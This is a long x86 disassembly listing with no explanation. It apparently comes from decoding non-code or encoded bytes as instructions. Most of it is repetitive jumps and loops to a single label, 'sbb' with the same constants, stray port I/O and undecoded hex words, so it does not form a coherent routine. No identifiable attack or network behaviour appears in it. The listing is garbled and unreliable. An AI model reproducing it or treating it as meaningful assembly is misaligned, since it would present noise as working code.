sbb eax 0xea76f1d
jb r-xdata
shr [ esi ] cl
sub ecx [ ebx ]
jb r-xdata
jb r-xdata
hlt
jb r-xdata
imul ebp [ edi - 0x7b4f44f6 ] 0x6b
scasd [ edi ]
mov [ edx + 0x65e0bb8 ] bl
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ecx [ ebp + 0x39 ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
loop r-xdata
or bl [ ebx - 0x2e1d1d0b ]
and cl [ ebx ]
push ecx
in eax 0xe2
adc [ 0x2267bb1d ] bl
sbb eax 0x4c0a721d
jb r-xdata
loop r-xdata
sbb eax 0xe288ee97
sbb eax 0xe2e26272
loop r-xdata
loop r-xdata
xchg esi eax
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0x72727221
sbb eax 0xb76f721d
jb r-xdata
jb r-xdata
push cs
scasd [ edi ]
jb r-xdata
jb r-xdata
sbb eax 0x1ea71d1d
jb r-xdata
int 0xf0
loop r-xdata
and ch ch
dec esp
fcomp [ 0xa721d1d ]
jb r-xdata
imul esp [ 0x1d028b0b ] 0x7272721d
jb r-xdata
jb r-xdata
push cs
arpl [ esi ] cx
mov dh 0xeb
jb r-xdata
jb r-xdata
popad
sbb bh cl
or esi [ ebx + 0x5 ]
sbb eax 0x88ba721d
xchg [ ecx + 0x12a76b84 ] edi
or ecx [ ecx + 0x1d1d1d2a ]
cmc
or edi [ eax + 0x721d1d5f ]
jb r-xdata
mov [ ebx + 0x6a76b84 ] ch
jb r-xdata
jb r-xdata
mov cl 0x61
mov [ eax + 0x200b2169 ] dl
sbb eax 0x8788ba72
mov ecx 0x12a76b84
adc al 0xd9
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x1bd5f4e2 ] 0xffffffe2
stosb [ edi ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ss
jb r-xdata
jb r-xdata
jb r-xdata
sti
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
outsd
sbb bl [ edi ]
sbb eax 0xf5e20a1d
cmpsd [ esi ] [ edi ]
and dh [ edx + 0x1fbe676f ]
sbb eax 0x971db21d
0xb236a76f 0x9b0b
cli
jb r-xdata
imul esp esi 0xffffffc6
sbb ah [ edi + 0x1d ]
in eax dx
loop r-xdata
shl [ edx ] 0x1
mov cl 0xb
mov al [ 0xffffffffd1e2e2f8 ]
popad
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
fwait
cmc
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0x100bba88
retn 0xe2e2
jb r-xdata
sbb eax 0x751db21d
outsd
mov dh 0x19
push ds
mov bl 0xb
and dh [ edx - 0x50901f78 ]
in al dx
sbb eax 0x480b1ea7
loopne r-xdata
fldenv [ ecx ]
in eax dx
or edx [ edx ]
jb r-xdata
jb r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
mov cl 0xb4
mov ch [ ebx - 0x3f ]
jb r-xdata
loop r-xdata
jb r-xdata
push es
test [ ebx - 0x59 ] ch
jb r-xdata
sbb cl cl
jb r-xdata
or ecx [ edi + ecx + 0x72721d1d ]
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
fcom [ esi ]
sbb eax 0xd5da8a1d
mov dl ah
test [ 0x321d1ba7 ] ah
cmpsd [ esi ] [ edi ]
adc ecx [ eax + 0x25e288e2 ]
or ecx [ ecx + 0x72e2e2e9 ]
jb r-xdata
sbb eax 0xdcd5da8a
jb r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
sub ecx [ bp + di ]
movsb [ edi ] [ esi ]
jb r-xdata
push cs
test [ ebx - 0x59 ] ch
add [ ebx ] cl
mov cl 0xe7
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x971d1e97
push es
sbb eax 0xe28afeb5
outsd
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ esi + 0x721d1d01 ]
add [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
mov edx 0x1d3e360b
or edx eax
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xf2a1691d
and ch ch
mov si 0xe2ff
loop r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jecxz r-xdata
shl [ edx ] 0x1
or edx [ ecx - 0x1b ]
loop r-xdata
loop r-xdata
mov bh 0x69
cli
or edi [ esp + ebp * 8 + 0x751de2e2 ]
inc esi
loop r-xdata
sbb eax 0x971db272
jb r-xdata
loop r-xdata
imul esp [ edi - 0x115096e2 ] 0x1d160f0b
mov edx 0xe2c2100b
loop r-xdata
jb r-xdata
push cs
jb r-xdata
xchg esp eax
jb r-xdata
push ds
imul edi [ edi - 0x7bc62ee2 ] 0x6b
mov edi 0xd1ac0b1c
loop r-xdata
ror [ ebx ] 0xe2
jb r-xdata
outsb
pop ecx
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x72727272
imul esi [ edi - 0x6e7747c4 ] 0xffffff84
imul esi [ edi - 0x7bcc96fe ] 0x6b
mov bh 0x0
imul esp [ esi + ecx - 0x1e ] 0xffffffe2
sbb eax 0xb172721d
popad
jb r-xdata
sbb eax 0x25727272
jb r-xdata
loop r-xdata
jb r-xdata
fcmovbe st5
jb r-xdata
jb r-xdata
imul esp [ edi - 0x1e62f40e ] 0x7272e2e2
jb r-xdata
jb r-xdata
jb r-xdata
or [ ebx ] 0x79
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
push ds
sbb eax 0xb51d0697
dec [ edx - 0x1d1d9d1e ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
ror ah 0x1
loop r-xdata
jb r-xdata
jb r-xdata
mov [ 0x1d1e9f6b ] bl
or esi [ ecx + 0x72e2e2ff ]
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
outsd
push cs
mov ch 0x88
out 0x8a al
shr [ ebx ] 0x1
or ecx [ edx - 0x7 ]
loop r-xdata
scasd [ edi ]
0x1d01b00b 0x721d
and eax 0x918e1ea7
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] 0x72721d1d
mov [ ebp - 0x1d0c1cf5 ] cl
jb r-xdata
or eax 0x72721d1d
jb r-xdata
or edi edx
jb r-xdata
sbb eax 0x1db2721d
sar [ edx - 0x63f43878 ] 0x1e
sbb cl [ ebx ]
jb r-xdata
adc dl al
jb r-xdata
loop r-xdata
sbb eax 0xb4727272
jb r-xdata
jb r-xdata
loopne r-xdata
loop r-xdata
imul ecx [ esi ] 0xebb60e63
loop r-xdata
jb r-xdata
xchg [ ebx + ebp * 2 - 0x7745f359 ] eax
mov [ ecx + 0x2a ] gs
jb r-xdata
xor eax [ ebx + ebp * 2 - 0x64f4ff49 ]
aas
sbb eax 0x751d721d
dec edx
loop r-xdata
push 0xe654edf3
in al dx
jb r-xdata
mov edx 0x6b84ab88
lahf
sbb cl [ ebx ]
neg [ ecx + 0x1d ]
and cl [ ebx ]
pop ss
jecxz r-xdata
mul [ edi + 0x22 ]
jb r-xdata
sbb [ 0x7272721d ] bl
jb r-xdata
and ebp ebp
jb r-xdata
and [ ebx ] ecx
rcl [ ecx + ebx * 8 ] 0x1
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ eax + 0x721d1d2a ]
jb r-xdata
loop r-xdata
jb r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
jb r-xdata
or eax 0x72e2e2f0
jb r-xdata
cmp eax 0x72721d1d
jb r-xdata
jns r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
popad
sahf
jb r-xdata
jb r-xdata
loop r-xdata
and ah [ esi - 0x1e ]
imul esp [ edi + 0xaa76b1a ] 0x1d1ab20b
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
out 0x6b al
cmpsb [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
scasd [ edi ]
push ss
loope r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
push ds
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
lea ecx [ ebx ]
jecxz r-xdata
sbb [ 0xb94881d ] bl
mov edi 0x72e2e2f4
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
and eax 0x1d028b0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
or dl [ edi ]
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
imul esp [ edi - 0x737745f4 ] 0x69
sub cl [ ebx ]
dec eax
pop esp
jb r-xdata
jb r-xdata
loop r-xdata
in eax dx
push esp
in eax dx
push esp
jb r-xdata
or ebx [ ebx + 0x721d1d3f ]
sbb eax 0xe2e24a75
mov [ ecx + 0x2b76b84 ] dl
imul esi [ ebx ] 0xb76b84
loop r-xdata
and ch ch
jb r-xdata
jb r-xdata
jge r-xdata
sbb ebp ebp
fldenv [ ecx ]
jb r-xdata
loop r-xdata
mov ah 0xea
mov [ esi - 0x5990e22f ] ah
sub bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edx + 0x2aa00be6 ] 0x72721d1d
jb r-xdata
pop ecx
sub [ 0x7272721d ] bl
jb r-xdata
sub ecx [ ebx ]
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
cld
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov ss [ ecx + 0x741de2c0 ]
jb r-xdata
or edi [ ecx + 0x3e ]
jb r-xdata
jb r-xdata
mov dl 0xb
jb r-xdata
loop r-xdata
mul [ es : edi + 0x22 ]
or esi [ edx ]
adc eax 0x72721d1d
jb r-xdata
xchg ebp eax
jb r-xdata
sbb ch [ ebx - 0x59 ]
jb r-xdata
or cl [ ebx ]
sbb ch [ ecx - 0x59 ]
jb r-xdata
0xe2e2
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mul [ ebx - 0x12115027 ]
pushad
adc al 0xfb
int3
mov dh ah
imul esp [ esi - 0x1d75353a ] 0xffffffd2
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb ch [ edi - 0x51 ]
add dh [ ebx + 0x691e921d ]
shl dl 0x1d
xchg ecx eax
jb r-xdata
imul esi [ edi + 0x1ea7691a ] 0x6b
and bh [ ebp + 0x212bb9bc ]
jb r-xdata
or esp [ eax - 0x2e1d1d08 ]
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah cl
adc cl [ esi ]
jb r-xdata
test [ ebx - 0x51 ] ch
sbb bh [ ebx + 0x18af6b84 ]
mov [ eax + 0x1d1e6c0b ] al
sbb eax 0x72727272
jb r-xdata
sbb eax 0xa66fbb1d
jb r-xdata
or al 0xba
jb r-xdata
and eax 0x1d0466ed
sbb eax 0x67bcbd1d
leave
test [ ebx - 0x49 ] ch
cmp al 0xb8
out 0xec al
jb r-xdata
0x1d1e971d 0x697
jb r-xdata
jb r-xdata
or ebx eax
jb r-xdata
0x1dd1a688 0xa66f
sbb eax 0x72727272
jb r-xdata
jb r-xdata
or bl cl
pop ebx
sbb eax 0xee26611d
sbb eax 0xe2e24a75
jb r-xdata
push ss
mov bl dl
jb r-xdata
pop edx
test [ 0x67bb1d1d ] dh
and ch ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
dec ebx
retn 0xe2e2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esi esp 0x3d
sbb eax 0xc7510b1d
loop r-xdata
jb r-xdata
adc al 0xd
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ ebx + 0x72e2e2ca ]
loop r-xdata
jb r-xdata
into
xchg bp ax
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
push ds
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
push es
jb r-xdata
jb r-xdata
lahf
push ds
in eax dx
popf
add [ 0xffffffffe688b51d ] ebx
outsd
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
loope r-xdata
mov eax [ 0x721d1d3d ]
jb r-xdata
loop r-xdata
jb r-xdata
je r-xdata
sbb eax 0x1d1e9f6b
jb r-xdata
jb r-xdata
mov ch bh
or [ ecx + 0x2a ] ch
test [ ebx - 0x51 ] ch
mov dl al
test [ ebx - 0x51 ] ch
or bh [ ebx - 0x50947b50 ]
jb r-xdata
sbb eax 0x7272212b
jb r-xdata
sbb eax 0xc6a66fbb
fimul [ ebx ]
retn
jb r-xdata
mov [ ecx + ebp * 2 + 0x5c480b2a ] cl
in eax dx
xchg edi eax
push ds
jb r-xdata
jb r-xdata
adc eax 0x72721d1d
jb r-xdata
aad 0xdc
jb r-xdata
jb r-xdata
in al dx
jb r-xdata
push cs
loop r-xdata
imul esp [ edx + ebx * 4 + 0x1d36e50a ] 0x1d
cdq
cld
aaa
mov ch 0x6b
stosd [ edi ]
imul esi [ ecx ] 0xa46bb57c
or ah ch
cmp bl [ 0xffffffffa226611d ]
mov bl [ edx + eax * 4 ]
imul esp [ edi + 0x8330b1a ] 0x72721d1d
jb r-xdata
cmp ah [ edi + 0x39 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl [ edx ] 0x1
jb r-xdata
mov dl 0xb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe2e25a74
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and bl bl
jb r-xdata
mov dl 0x88
loop r-xdata
jb r-xdata
or esi [ esi ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esi [ edx + 0x721d1d1a ]
jb r-xdata
imul esp [ edi + 0x1aa76906 ] 0x6b
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esp [ edi + 0x6a76b1e ] 0x6b1aa769
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
je r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
outsd
cmpsb [ esi ] [ edi ]
jb r-xdata
sbb eax 0xb51d0697
jb r-xdata
loop r-xdata
sbb eax 0x88ba7272
sbb eax 0xa688eab4
rcr [ 0xffffffffaec6a66f ] 0x1
mov ch 0xb2
or ah dh
pop eax
sbb eax 0xa680b1d
out 0xb al
mov al [ 0x721d1d2a ]
sbb al 0x84
imul ebx [ edi - 0x7be22efe ] 0x6b
loop r-xdata
jb r-xdata
loop r-xdata
or [ edi ] 0xf6a46bb5
or dl [ esi + 0x668a1d1d ]
sbb eax 0x8aa22661
sbb al 0x82
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ ebx ] ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and cl [ eax - 0x58947b34 ]
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edx + eax * 4 + 0x1d3e790b ] 0x1d
jb r-xdata
jb r-xdata
push ds
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
popad
clc
jb r-xdata
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp [ edx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
retn 0x6b84
pop esp
sbb al 0x1d
sbb eax 0x72727272
jb r-xdata
push ds
jb r-xdata
loop r-xdata
jb r-xdata
adc ebp ebp
jb r-xdata
sbb bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
imul esp [ edi + 0x1ab20b0a ] 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
mov ebx 0x3caf6b84
or edx [ esi + 0x39 ]
sbb eax 0x7272721d
mov ebx 0x6b84cc88
scasd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
push es
sbb eax 0x1db1feb5
xchg edi eax
or bl [ 0xffffffffe2e27a75 ]
loop r-xdata
in eax dx
pop di
sbb eax 0xeebfdb1d
in eax dx
0x1d5f 0x691d
loop r-xdata
jb r-xdata
push ds
xchg [ ebx + ebp * 2 - 0x7745f559 ] eax
mov [ ebx + ebp * 2 + 0xbba08a7 ] es
lodsd [ esi ]
adc bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor [ edx ] dl
jb r-xdata
jb r-xdata
jb r-xdata
adc bl [ 0x7272721d ]
imul edi [ edx ] 0x300b3967
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
int3
jb r-xdata
in eax dx
mov ch 0x6b
jb r-xdata
mov bl 0x1d
xchg edx eax
0xbeaafe1 0x1b0
cmpsd [ esi ] [ edi ]
sar [ ecx ] 0x1
test [ ebx - 0x41 ] ch
enter 0x3d69 0x84
loop r-xdata
js r-xdata
mov [ esp + eax * 4 + 0x69fea76b ] cl
and [ ebx ] cl
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
or esp [ ecx + 0x721d1d3d ]
jb r-xdata
jb r-xdata
imul esp [ edi + 0xb2069fe ] 0xffffffa7
jb r-xdata
out dx al
mov cl 0x1d
mov ah 0xd6
or edi esi
lahf
jb r-xdata
jb r-xdata
or al 0x13
jb r-xdata
in eax dx
ja r-xdata
imul ecx [ esi ] 0x88ee0e61
jb r-xdata
imul esp [ edi - 0x24dd2ee2 ] 0xffffffa7
push cs
xchg ebx eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sti
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov edi 0xdc0bb91a
jb r-xdata
loop r-xdata
or esi [ edx + eax * 8 ]
jb r-xdata
or eax ebx
and [ 0x7272721d ] ebx
jb r-xdata
mov dl 0x84
imul esp [ ebp - 0x591e7b20 ] 0x55edfec6
and dh [ edx - 0x23f5db97 ]
daa
sbb eax 0xee26611d
push ss
in eax dx
pushad
adc eax 0x6f1d1d03
cmpsd [ esi ] [ edi ]
add dh [ edx + 0x1db6941d ]
mov edi 0xba66edee
loop r-xdata
loop r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
or ebx [ ebp + 0x72e2e2f4 ]
jb r-xdata
mov ecx 0x72727221
jb r-xdata
cmp [ bp + di ] ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6b774510 ] 0xffffff84
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
jb r-xdata
movsb [ edi ] [ esi ]
jb r-xdata
imul edx [ edx ] 0x66ed11d9
inc ebx
and ah dl
loop r-xdata
loop r-xdata
or edx [ ecx + 0x72721d1d ]
jb r-xdata
jb r-xdata
cmp [ ebx + ebp * 2 + 0x3d69c8bf ] eax
loop r-xdata
jb r-xdata
imul ebp edx 0xbeaafe1
mov al 0x1
sbb eax 0x7272721d
mov ch 0x1d
xchg edi eax
imul esp [ edi + 0x2af6f1a ] 0x1e921db3
sbb eax 0xd10a721d
adc bl [ 0x30fe8a1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x1a
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
adc al 0x88
mov [ esp + eax * 4 - 0x45e95895 ] dl
jb r-xdata
jb r-xdata
jb r-xdata
xchg [ esi ] ebx
and ah [ edx - 0x1d0743f5 ]
jb r-xdata
in eax dx
imul ecx [ esi ] 0xd1b5b3b3
sbb eax 0x1d28360b
sbb eax 0x72727272
jb r-xdata
imul esp [ esi + 0x2267fac6 ] 0xffffffed
out dx al
and ax 0x1d5a
sbb eax 0xe2ea9d61
xchg edi eax
sbb eax 0x25690e97
or ebp [ edx + 0x72e2e2f2 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
pop ss
mov dl ah
fcom [ 0x72721d1d ]
jb r-xdata
or cl [ edx ]
jb r-xdata
push ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
hlt
jb r-xdata
sub ecx [ ebx ]
jb r-xdata
or esi [ eax ]
jb r-xdata
jb r-xdata
jb r-xdata
in eax 0xfb
loop r-xdata
mov ah 0xb4
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or eax 0x72721d1d
jb r-xdata
jb r-xdata
or ah dl
sbb ebx [ 0xffffffffd912691d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push cs
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
stosb [ edi ]
jb r-xdata
test [ ebx - 0x59 ] ch
movsd [ edi ] [ esi ]
jb r-xdata
mov [ ebx + ebp * 2 + 0x2069fea7 ] es
or esp [ edi + 0x72e2e2fc ]
jb r-xdata
xor [ edx + 0x1d ] bl
sbb eax 0xc6c69e61
loop r-xdata
cli
and ch ch
imul ebp [ edx ] 0x1d27260a
sbb eax 0xe2ebda0b
loop r-xdata
mov dl 0xd9
mov dh 0xea
mov dl 0xed
loope r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xba72721d
jb r-xdata
xor eax 0xee8a1d1d
jb r-xdata
loop r-xdata
jb r-xdata
mov eax [ 0xffffffffe165e669 ]
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or eax [ eax - 0x36 ]
loop r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
push cs
movlps [ 0x7272721d ] xmm3
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
and al ah
test [ ecx - 0x22 ] ah
loop r-xdata
0xe2e68f0b 0x72e2
imul esp [ edx - 0x1ee41e06 ] 0x6b13e13b
mov dl al
jb r-xdata
xchg esp eax
jb r-xdata
jb r-xdata
imul edi [ edi - 0x23f446e6 ] 0xffffffc6
loop r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
pop esi
rcl [ edx ] 0x1
jb r-xdata
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
std
mov dl ch
jb r-xdata
jb r-xdata
jb r-xdata
mov edx 0x6b848c88
jb r-xdata
imul esp [ eax ] 0xe2fca70b
loop r-xdata
jb r-xdata
cdq
jb r-xdata
mov ah cl
shl [ edx ] 0x1
jb r-xdata
mov bh 0x2a
test [ ebx - 0x49 ] ch
adc [ eax + 0x6b848e88 ] bh
push ss
jb r-xdata
sbb eax 0xe252741d
loop r-xdata
loop r-xdata
sbb eax 0x6bee2661
cmpsb [ esi ] [ edi ]
imul esp [ edi - 0x33774504 ] 0xffffffbc
mov [ edi - 0x3d58947c ] al
imul esp [ esp + eax * 4 ] 0xbc0a76b
loope r-xdata
jb r-xdata
and cl [ ebx ]
outsb
add ebx [ 0xffffffffdb72721d ]
cmpsd [ esi ] [ edi ]
or ecx [ eax + 0x5c ]
mov [ edi + 0xca76b84 ] al
mov edx 0x2a698c88
jb r-xdata
jb r-xdata
sbb eax 0x214dee8a
jb r-xdata
sbb cl cl
adc dh [ edi ]
jb r-xdata
out 0x65 al
jb r-xdata
inc esi
mov edi 0xb76b8442
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x721d1d38 0x7272
jb r-xdata
jb r-xdata
jb r-xdata
sub ecx [ bp + di ]
loope r-xdata
jb r-xdata
mov cl 0xb
not [ edi ]
sbb eax 0x7272721d
outsd
inc edx
pop ss
sbb eax 0xbb2b11d
retn 0xe2f7
jb r-xdata
sbb eax 0x7272721d
in eax dx
0xe2e2
popfd
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
pop [ ebx + ebp * 2 - 0x77450759 ]
or edi edi
cli
loop r-xdata
test [ ebx - 0x59 ] ch
fistp [ ecx - 0x334cf436 ]
jb r-xdata
sbb bh [ ecx - 0x1d3923f5 ]
loop r-xdata
popad
jb r-xdata
sbb eax 0x30fe8a1d
jb r-xdata
or edi [ eax - 0x14 ]
jb r-xdata
jb r-xdata
jb r-xdata
outsd
fst [ ecx ]
jb r-xdata
in eax dx
cmpsd [ esi ] [ edi ]
jb r-xdata
or esp [ ecx + 0x3d ]
jb r-xdata
or esi [ ebx + 0x72e2e2cc ]
jb r-xdata
jb r-xdata
or esp [ ebx + ecx ]
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
popad
push cs
mov cl 0xb5
sbb eax 0xe2e25674
je r-xdata
imul edi [ edi + 0x135b0b1e ] 0x1d
sbb eax 0x72727272
imul esp [ esi - 0x1597193a ] 0x21fd0ba2
sbb eax 0xedaa721d
push ebp
loop r-xdata
sbb eax 0x7272721d
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
adc al 0xb
mov [ esi ] ss
push edx
jb r-xdata
jb r-xdata
out dx al
jb r-xdata
jl r-xdata
jb r-xdata
sbb eax 0x39d11269
fst [ ecx ]
loop r-xdata
sbb eax 0x6c66ed1d
jb r-xdata
jb r-xdata
0x1d3ac20b 0x721d
loope r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
imul esp eax 0x7221e3c9
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg [ edx + 0x1ea76b84 ] edi
loope r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
0xb30b
jb r-xdata
loop r-xdata
mov bh dh
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
mov ah 0x88
jb r-xdata
cmp eax 0x72721d1d
jb r-xdata
popad
jb r-xdata
int3
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
mov [ 0xb1ea76b ] al
and bl [ eax ]
scasd [ edi ]
push ds
mov bl 0xb2
mov al ah
mov bh [ edi + ecx * 4 ]
xor eax 0xe9d80b41
loop r-xdata
sub ebx [ 0x1e87611d ]
or ebx [ 0xffffffffbe66ed1d ]
jb r-xdata
sbb eax 0xbe66ed1d
and al 0xb
jb r-xdata
jb r-xdata
jb r-xdata
push cs
loop r-xdata
mov ecx 0xb469212b
outsd
loop r-xdata
or ebx [ esi + 0xf ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
pop edx
sbb eax 0xc69e611d
in ax 0xe2
loop r-xdata
test eax 0x58100b6e
sbb eax 0x69b7721d
shl [ edx ] 0x1
fistp [ edi + 0x309d0b1e ]
sbb eax 0x7272721d
stosd [ edi ]
jb r-xdata
jb r-xdata
popad
push es
sbb ah [ ebx + 0xe ]
loop r-xdata
adc edx [ ebx ]
jb r-xdata
jb r-xdata
loopne r-xdata
in eax dx
insb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x710bceb4
aas
or cl [ ebx - 0x44e2e2cc ]
mov bh 0x46
jb r-xdata
jb r-xdata
jb r-xdata
imul esp esi 0xeaa7e165
or eax edx
cmp bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x48947bbe ] 0x46
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi + 0xb22671a ] 0xffffff9a
jb r-xdata
xchg al ch
loop r-xdata
and ch ch
call [ bx + di ]
sbb eax 0xbabe881d
test [ ebx - 0x59 ] ch
jb r-xdata
or ecx [ edi ]
jb r-xdata
sbb ah [ edi + 0x22 ]
adc ebp [ ebx - 0x59 ]
jb r-xdata
loop r-xdata
mov bl 0xcc
jb r-xdata
xor [ esi + 0x6b ] bl
jb r-xdata
out dx al
sbb eax 0xd912691d
popad
jb r-xdata
or ebp ebp
or bl [ 0x7272721d ]
retn 0xff0b
jb r-xdata
sbb eax 0x72727272
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
or esi edx
in al dx
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x2bbe66ed
sbb eax 0x1e87611d
mov cl ah
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor bl [ edi + 0x1d ]
sbb eax 0x72727272
